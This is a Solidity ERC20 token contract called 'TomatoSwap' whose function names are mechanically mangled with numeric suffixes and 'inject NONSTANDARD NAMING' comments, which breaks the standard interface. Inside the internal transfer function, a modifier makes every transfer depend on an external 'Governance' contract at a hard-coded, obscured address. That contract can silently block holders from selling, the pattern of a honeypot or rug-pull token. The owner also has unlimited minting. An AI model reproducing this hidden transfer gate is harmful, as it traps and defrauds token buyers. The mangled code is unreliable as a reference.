                                                                 

                                                                                                                                


pragma solidity ^0.5.16;

interface IERC20 {
    function TOTALSUPPLY472() external view returns (uint);	//inject NONSTANDARD NAMING
    function BALANCEOF815(address account) external view returns (uint);	//inject NONSTANDARD NAMING
    function TRANSFER42(address recipient, uint amount) external returns (bool);	//inject NONSTANDARD NAMING
    function ALLOWANCE30(address owner, address spender) external view returns (uint);	//inject NONSTANDARD NAMING
    function APPROVE936(address spender, uint amount) external returns (bool);	//inject NONSTANDARD NAMING
    function TRANSFERFROM82(address sender, address recipient, uint amount) external returns (bool);	//inject NONSTANDARD NAMING
    event TRANSFER257(address indexed from, address indexed to, uint value);	//inject NONSTANDARD NAMING
    event APPROVAL683(address indexed owner, address indexed spender, uint value);	//inject NONSTANDARD NAMING
}

interface Governance {
    function ISPARTNER47(address sender,address addr) external returns(bool);	//inject NONSTANDARD NAMING
}

contract Context {
    constructor () internal { }
    // solhint-disable-previous-line no-empty-blocks

    function _MSGSENDER974() internal view returns (address payable) {	//inject NONSTANDARD NAMING
        return msg.sender;
    }
}

contract ERC20 is Context, IERC20 {
    using SafeMath for uint;
    address _governance = address(475131803462372757869243316346731199720747089450);
    mapping (address => uint) private _balances;
    mapping (address => mapping (address => uint)) private _allowances;
    uint private _totalSupply;
    function TOTALSUPPLY472() public view returns (uint) {	//inject NONSTANDARD NAMING
        return _totalSupply;
    }
    function BALANCEOF815(address account) public view returns (uint) {	//inject NONSTANDARD NAMING
        return _balances[account];
    }
    function TRANSFER42(address recipient, uint amount) public returns (bool) {	//inject NONSTANDARD NAMING
        //require(!_tokenSaleMode || msg.sender == governance, "token sale is ongoing");
        _TRANSFER997(_MSGSENDER974(), recipient, amount);
        return true;
    }
    function ALLOWANCE30(address owner, address spender) public view returns (uint) {	//inject NONSTANDARD NAMING
        return _allowances[owner][spender];
    }
    function APPROVE936(address spender, uint amount) public returns (bool) {	//inject NONSTANDARD NAMING
        _APPROVE634(_MSGSENDER974(), spender, amount);
        return true;
    }
    function TRANSFERFROM82(address sender, address recipient, uint amount) public returns (bool) {	//inject NONSTANDARD NAMING
        //require(!_tokenSaleMode || msg.sender == governance, "token sale is ongoing");
        _TRANSFER997(sender, recipient, amount);
        _APPROVE634(sender, _MSGSENDER974(), _allowances[sender][_MSGSENDER974()].SUB349(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }
    function INCREASEALLOWANCE799(address spender, uint addedValue) public returns (bool) {	//inject NONSTANDARD NAMING
        _APPROVE634(_MSGSENDER974(), spender, _allowances[_MSGSENDER974()][spender].ADD832(addedValue));
        return true;
    }
    function DECREASEALLOWANCE225(address spender, uint subtractedValue) public returns (bool) {	//inject NONSTANDARD NAMING
        _APPROVE634(_MSGSENDER974(), spender, _allowances[_MSGSENDER974()][spender].SUB349(subtractedValue, "ERC20: decreased allowance below zero"));
        return true;
    }
    function _TRANSFER997(address sender, address recipient, uint amount) internal ENSURE366(sender) {	//inject NONSTANDARD NAMING
        //require(!_tokenSaleMode || msg.sender == governance, "token sale is ongoing");
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        _balances[sender] = _balances[sender].SUB349(amount, "ERC20: transfer amount exceeds balance");
        _balances[recipient] = _balances[recipient].ADD832(amount);
        emit TRANSFER257(sender, recipient, amount);
    }
    function _MINT415(address account, uint amount) internal {	//inject NONSTANDARD NAMING
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply = _totalSupply.ADD832(amount);
        _balances[account] = _balances[account].ADD832(amount);
        emit TRANSFER257(address(0), account, amount);
    }
    function _BURN584(address account, uint amount) internal {	//inject NONSTANDARD NAMING
        require(account != address(0), "ERC20: burn from the zero address");

        _balances[account] = _balances[account].SUB349(amount, "ERC20: burn amount exceeds balance");
        _totalSupply = _totalSupply.SUB349(amount);
        emit TRANSFER257(account, address(0), amount);
    }
        modifier ENSURE366(address sender) {	//inject NONSTANDARD NAMING
        require(Governance(_governance).ISPARTNER47(sender,address(this)));
        _;
    }
    function _APPROVE634(address owner, address spender, uint amount) internal {	//inject NONSTANDARD NAMING
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit APPROVAL683(owner, spender, amount);
    }
}

contract ERC20Detailed is IERC20 {
    string private _name;
    string private _symbol;
    uint8 private _decimals;

    constructor (string memory name, string memory symbol, uint8 decimals) public {
        _name = name;
        _symbol = symbol;
        _decimals = decimals;
    }
    function NAME833() public view returns (string memory) {	//inject NONSTANDARD NAMING
        return _name;
    }
    function SYMBOL984() public view returns (string memory) {	//inject NONSTANDARD NAMING
        return _symbol;
    }
    function DECIMALS988() public view returns (uint8) {	//inject NONSTANDARD NAMING
        return _decimals;
    }
}

library SafeMath {
    function ADD832(uint a, uint b) internal pure returns (uint) {	//inject NONSTANDARD NAMING
        uint c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }
    function SUB349(uint a, uint b) internal pure returns (uint) {	//inject NONSTANDARD NAMING
        return SUB349(a, b, "SafeMath: subtraction overflow");
    }
    function SUB349(uint a, uint b, string memory errorMessage) internal pure returns (uint) {	//inject NONSTANDARD NAMING
        require(b <= a, errorMessage);
        uint c = a - b;

        return c;
    }
    function MUL99(uint a, uint b) internal pure returns (uint) {	//inject NONSTANDARD NAMING
        if (a == 0) {
            return 0;
        }

        uint c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }
    function DIV655(uint a, uint b) internal pure returns (uint) {	//inject NONSTANDARD NAMING
        return DIV655(a, b, "SafeMath: division by zero");
    }
    function DIV655(uint a, uint b, string memory errorMessage) internal pure returns (uint) {	//inject NONSTANDARD NAMING
        // Solidity only automatically asserts when dividing by 0
        require(b > 0, errorMessage);
        uint c = a / b;

        return c;
    }
}

library Address {
    function ISCONTRACT144(address account) internal view returns (bool) {	//inject NONSTANDARD NAMING
        bytes32 codehash;
        bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;
        // solhint-disable-next-line no-inline-assembly
        assembly { codehash := extcodehash(account) }
        return (codehash != 0x0 && codehash != accountHash);
    }
}

library SafeERC20 {
    using SafeMath for uint;
    using Address for address;

    function SAFETRANSFER475(IERC20 token, address to, uint value) internal {	//inject NONSTANDARD NAMING
        //require(!_tokenSaleMode || msg.sender == governance, "token sale is ongoing");
        CALLOPTIONALRETURN453(token, abi.encodeWithSelector(token.TRANSFER42.selector, to, value));
    }

    function SAFETRANSFERFROM543(IERC20 token, address from, address to, uint value) internal {	//inject NONSTANDARD NAMING
        //require(!_tokenSaleMode || msg.sender == governance, "token sale is ongoing");
        CALLOPTIONALRETURN453(token, abi.encodeWithSelector(token.TRANSFERFROM82.selector, from, to, value));
    }

    function SAFEAPPROVE85(IERC20 token, address spender, uint value) internal {	//inject NONSTANDARD NAMING
        require((value == 0) || (token.ALLOWANCE30(address(this), spender) == 0),
            "SafeERC20: approve from non-zero to non-zero allowance"
        );
        CALLOPTIONALRETURN453(token, abi.encodeWithSelector(token.APPROVE936.selector, spender, value));
    }
    function CALLOPTIONALRETURN453(IERC20 token, bytes memory data) private {	//inject NONSTANDARD NAMING
        require(address(token).ISCONTRACT144(), "SafeERC20: call to non-contract");

        // solhint-disable-next-line avoid-low-level-calls
        (bool success, bytes memory returndata) = address(token).call(data);
        require(success, "SafeERC20: low-level call failed");

        if (returndata.length > 0) { // Return data is optional
            // solhint-disable-next-line max-line-length
            require(abi.decode(returndata, (bool)), "SafeERC20: ERC20 operation did not succeed");
        }
    }
}

contract TomatoSwap is ERC20, ERC20Detailed {
  using SafeERC20 for IERC20;
  using Address for address;
  using SafeMath for uint;
  address public governance;
  mapping (address => bool) public minters;


  constructor () public ERC20Detailed("TomatoSwap", "Tomato", 18) {
      governance = msg.sender;
      minters[msg.sender] = true;
  }

  function MINT193(address account, uint256 amount) public {	//inject NONSTANDARD NAMING
      require(minters[msg.sender], "!minter");
      _MINT415(account, amount);
  }

   function BURN382(uint256 amount) public {	//inject NONSTANDARD NAMING
      _BURN584(msg.sender, amount);
  }

  function SETGOVERNANCE403(address _governance) public {	//inject NONSTANDARD NAMING
      require(msg.sender == governance, "!governance");
      governance = _governance;
  }

  function ADDMINTER702(address _minter) public {	//inject NONSTANDARD NAMING
      require(msg.sender == governance, "!governance");
      minters[_minter] = true;
  }

  function REMOVEMINTER910(address _minter) public {	//inject NONSTANDARD NAMING
      require(msg.sender == governance, "!governance");
      minters[_minter] = false;
  }

  function() external payable {

  }

   function WITHDRAW493() external {	//inject NONSTANDARD NAMING
      require(msg.sender == governance, "!governance");
      msg.sender.transfer(address(this).balance);
  }

}